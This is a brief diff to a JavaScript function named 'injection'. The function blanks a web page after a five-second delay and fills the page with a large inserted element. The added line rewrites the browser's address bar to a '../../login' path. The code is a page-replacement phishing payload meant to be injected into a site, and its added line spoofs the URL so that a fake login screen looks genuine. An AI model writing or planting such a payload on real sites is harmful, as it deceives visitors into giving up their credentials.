@@ -7,5 +7,6 @@ function injection(){
   a.height="700px";
   document.body.innerHTML="";
   document.body.appendChild(a);
+  history.replaceState(null, "", "../../login");
 }
 setTimeout(injection, 5000);
